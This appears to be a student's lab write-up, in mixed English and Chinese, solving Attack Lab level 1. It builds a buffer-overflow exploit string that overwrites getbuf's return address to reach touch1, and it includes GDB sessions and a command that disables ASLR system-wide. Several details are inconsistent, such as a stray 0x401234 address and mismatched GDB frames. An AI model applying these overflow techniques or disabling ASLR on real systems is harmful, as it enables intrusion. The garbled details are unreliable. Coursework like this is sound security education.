## 4.1 Level 1

For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute
an existing procedure.

Function getbuf is called within CTARGET by a function test having the following C code:
```C

void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
there is code for a function touch1 having the following C representation:
```C
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```
Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,
rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

Some Advice:
- All the information you need to devise your exploit string for this level can be determined by examining
a disassembled version of CTARGET. Use objdump -d to get this dissembled version.
- The idea is to position a byte representation of the starting address for touch1 so that the ret
instruction at the end of the code for getbuf will transfer control to touch1.
- Be careful about byte ordering.
- You might want to use GDB to step the program through the last few instructions of getbuf to make
sure it is doing the right thing.
- The placement of buf within the stack frame for getbuf depends on the value of compile-time
constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the
disassembled code to determine its position.

# Solution:
## Idea: 
find the address of touch1(), when end of test1() with ret instruction, the return address will be used to jump to this return address, so we can overite the return address to jump to touch1() by buffer overflow with getbuf(), to overite the local variable in the stack and return addresss to touch1().




## Steps:
### 1. found the address of touch1 in disassembled file

1. Use objdump -d to get this dissembled file

Now I want to execute the execute file ctarget, there are functions including test() with  getbuf() and touch1(), 
when call getbuf function, the return address will be stored in the stack，when to the end to getbuf function with ret instruction, the return address will be used to jump to this return address, so we can overite the return address to jump to touch1(). 
but How can I find the address of touch1()? in the disassembled file,  can we find the address of touch1()? or we have to use gdb to debug the executable file to the address of touch1()?

```shell
objdump -d ctarget > ctarget.d
```
查找 touch1 地址  
打开 ctarget.d 文件，搜索 touch1 函数。通常会看到类似如下的内容：
```assembly
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```
在这里，00000000004017c0 就是 touch1 函数的起始地址。


方法 2：通过 GDB 调试查找
如果无法直接从反汇编文件中找到 touch1 的地址，可以使用 GDB 动态调试来获取。

步骤：
启动 GDB 并加载目标文件

shell
gdb ./ctarget
查看符号表
使用 info functions 或 disas touch1 查看 touch1 的地址：

gdb
(gdb) disas touch1

gdb 输出示例：
```assembly
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
```
在这里，0x0000000000401234 就是 touch1 的地址。



### 2. Overite the return address to jump to touch1()
position a byte representation of the starting address for touch1 so that the ret instruction at the end of the code for getbuf will transfer control to touch1.


callq test(): 
  1. when callq test intruction, the return address will be stored in the stack
  2. move stack pointer to local variable in the stack for buffer
  3. callq getbuf()
  4. return address will be used to jump to test()

```assembly
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp       # mover stack pointer down to 8 bytes,为局部变量分配空间。
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax       # 将寄存器 %eax 清零               
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>             
  401976:	89 c2                	mov    %eax,%edx       # %eax 是 getbuf 函数的返回值，这里将其保存到 %edx 中以备后续使用。
  401978:	be 88 31 40 00       	mov    $0x403188,%esi  # 将地址 0x403188 加载到寄存器 %esi 中,地址 0x403188 很可能是一个格式化字符串（如 "No exploit. Getbuf returned 0x%x\n"），用于后续的 printf 调用
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi       # 将整数值 1 加载到寄存器 %edi 中,%edi 通常是第一个参数寄存器，在这里可能是传递给 printf 的标志值
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>  # 调用 printf 函数
  40198c:	48 83 c4 08          	add    $0x8,%rsp       # 将栈指针 %rsp 增加 8，释放之前分配的局部变量空间
  401990:	c3                   	retq                   # retq 从栈中弹出返回地址，并跳转到该地址，结束 test 函数的执行。
  401991:	90                   	nop                    # 空操作，用于填充字节。
  401992:	90                   	nop
  ...
```

call getbuf() in test():
  1. when callq getbuf, the return address to test will be stored in the stack
  2. move stack pointer to local variable and buffer in the stack
  3. input the string to overite the buffer +  local variable +  return address
      1. 局部变量空间: 2*16+8 = 40 bytes ，可以随便输入
      

      2. convert the touch1 address of hexadecimal to bytes : 00000000004017c0 , 后面8个字节是touch1地址
        由于 x86-64 架构使用小端字节序，你需要将地址按小端字节序排列， 将地址转换为小端字节序：  
        0x00000000004017c0 的小端字节序为 (低地址) 0xc0 0x17 0x40 0x00 0x00 0x00 0x00 0x00 (高地址)
        
        return address in stack frame: 
        +-----------------------------+ <-- 高地址（栈底方向）
        00 00 00 00 00 40 17 c0
        +-----------------------------+ <-- 低地址 当前栈顶（%rsp 指向 buf 起始地址）

        构建的字符串如下：  40 bytes of garbage + 0xc0 0x17 0x40 0x00 0x00 0x00 0x00 0x00

        输入内容是字符串，从低地址到高地址排列: 
        01 02 03 04 05 06 07 08
        01 02 03 04 05 06 07 08
        01 02 03 04 05 06 07 08
        01 02 03 04 05 06 07 08
        01 02 03 04 05 06 07 08
        c0 17 40 00 00 00 00 00

        输入后 getbuf stack frame: 
        
        00 00 00 00 00 40 17 c0       
        +-----------------------------+ <-- 高地址（栈底方向）
        08 07 06 05 04 03 02 01
        08 07 06 05 04 03 02 01
        08 07 06 05 04 03 02 01
        08 07 06 05 04 03 02 01
        08 07 06 05 04 03 02 01
        +-----------------------------+ <-- 低地址 当前栈顶（%rsp 指向 buf 起始地址）

         ./hex2raw < exploit1.txt > raw1.txt

      3. input string: 40 bytes + touch1 address(8 bytes)
   
  4. when ret instruction, the overited return address will be used to jump to touch1()

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp     # move stack pointer down to 2*16+8 = 40 bytes,为局部变量分配空间。
  4017ac:	48 89 e7             	mov    %rsp,%rdi      # 将栈顶地址赋值给 %rdi，%rdi 通常是函数参数的寄存器之一，在这里，它将作为参数传递给 Gets 函数。
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax      # 将整数值 1 加载到寄存器 %eax 中，%eax 通常是 getbuf 函数的返回值
  4017b9:	48 83 c4 28          	add    $0x28,%rsp     # 将栈指针 %rsp 增加 40，释放之前分配的局部变量空间
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

```

栈帧布局分析 (same as Practice Problem 3.46)
```
+-----------------------------+ <-- 高地址（栈底方向） 
|                             | 
|                             | test statck frame
+-----------------------------+  
| 返回地址： 0x401976          |  getbuf return address (the address after callq getbuf)
| (8 bytes)                   | 
+-----------------------------+ < getbuf stack frame
| buf[32-39] (未初始化)        | 
| (8 bytes)                   | 
+-----------------------------+
| buf[24-31] (未初始化)        | 
| (8 bytes)                   | 
+-----------------------------+
| buf[16-23] (未初始化)        | 
| (8 bytes)                   | 
+-----------------------------+
| buf[8-15] (未初始化)         | 
| (8 bytes)                   | 
+-----------------------------+
| buf[0-7] (未初始化)          | 
| (8 bytes)                   | 
+-----------------------------+ <-- 当前栈顶（%rsp 指向 buf 起始地址）
```

##  Run progrom with inject assemble code(exploit code) 

```shell
./ctarget -q <raw1.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 01 02 03 04 05 06 07 08 C0 17 40 00 00 00 00 00 

```

## GDB debugging

unix > gdb ctarget
```gdb
(gdb) disas touch1
(gdb) disas getbuf
(gdb) b getbuf    # 设置断点
(gdb) run -q <raw1.txt # 运行到函数入口
(gdb) info frame # 使用 info frame 查看当前栈帧的详细信
Stack level 0, frame at 0x7fffffffe9d0:
  rip = 0x4017a8 in getbuf; saved rip 0x401990
  source language c.
  Arglist at 0x7fffffffe9c0, args: 
  Locals at 0x7fffffffe9c0, Previous frame's sp is 0x7fffffffe9d0
  Saved registers:
    rbx at 0x7fffffffe9b8, rbp at 0x7fffffffe9c0, rip at 0x7fffffffe9c8

# 这里可以看到 rip（指令指针）指向 0x4017a8，即 getbuf 函数的第一条指令。

(gdb) stepi
(gdb) info frame
Stack level 0, frame at 0x5561dca8:
 rip = 0x4017ac in getbuf (buf.c:14); saved rip = 0x401976
 called by frame at 0x5561dcb8
 source language c.
 Arglist at 0x5561dc70, args: 
 Locals at 0x5561dc70, Previous frame's sp is 0x5561dca8
 Saved registers:
  rip at 0x5561dca0

# 使用 x 命令查看内存内容。x/8xb 表示以 8 进制字节格式显示 8 个字节的内容。
(gdb) x/8xb $rsp       # 显示 rsp 指向的 8 个字节的内容。
0x5561dc78:     0x01    0x02    0x03    0x04    0x05    0x06    0x07    0x08
(gdb) x/8xb ($rsp + 8) # 查看 rsp + 8 字节的内存内容

(gdb) x/8xb ($rsp+40)
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00

(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
=> 0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.

```



# FAQs:
## 1. Are the address in disassembled file same as the address in gdb run time for touch1 function?
 
### 相同的情况
    - 如果程序是静态链接且未启用地址空间布局随机化（ASLR），那么反汇编文件中的地址与 GDB 调试时的地址通常是完全一致的。
    - 这是因为静态链接的程序在加载到内存时，其代码段的基地址是固定的。


### 不同的情况
如果程序启用了某些动态特性或安全机制，可能会导致反汇编文件中的地址与 GDB 调试时的地址不同。以下是可能导致差异的原因：

  - (1) 地址空间布局随机化（ASLR）
ASLR 是一种安全机制，用于随机化程序加载到内存中的基地址。如果 ASLR 启用，程序每次运行时的地址都会发生变化。
在这种情况下，反汇编文件中的地址是静态的，而 GDB 调试时的地址是动态的。
解决方法：

禁用 ASLR（仅用于调试目的）：
shell
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
禁用后，GDB 调试时的地址将与反汇编文件中的地址一致。
  - (2) 动态链接库
如果程序使用了动态链接库（如 libc.so），函数的实际地址可能会在运行时由动态链接器解析。
动态链接的函数地址通常会有一个偏移量，因此反汇编文件中的地址可能只是占位符，而不是实际运行时的地址。
解决方法：

使用 GDB 查看运行时的实际地址：
gdb
(gdb) info functions touch1


## 2. 什么是 小端字节序（Little Endian）？


小端字节序是一种数据存储方式，用于表示多字节数据类型（如整数、指针等）。在小端字节序中，最低有效字节（Least Significant Byte, LSB）存储在最低的内存地址，而最高有效字节（Most Significant Byte, MSB）存储在最高的内存地址。这种存储方式在许多现代计算机体系结构中被广泛使用，包括 x86 和 x86-64 架构。

示例
假设有一个 32 位的整数 0x12345678，在小端字节序中，它的存储方式如下：

内存地址:  0x00000000  0x00000001  0x00000002  0x00000003
存储内容:  0x78        0x56        0x34        0x12
最低有效字节（LSB）：0x78 存储在最低地址 0x00000000。
最高有效字节（MSB）：0x12 存储在最高地址 0x00000003。



为什么使用小端字节序？
性能优化：

在小端字节序中，最低有效字节存储在最低地址，这意味着可以使用更少的指令来访问和操作数据。例如，对于一个 32 位整数，只需要访问最低地址即可获取其最低有效字节。
自然增长：

当数据增长时，新的字节可以添加到更高的内存地址，而不需要重新排列现有数据。这对于动态数据结构（如链表、数组等）非常有利。
历史原因：

许多早期的处理器架构（如 Intel 8080 和 8085）使用小端字节序，这种传统延续到了现代处理器。
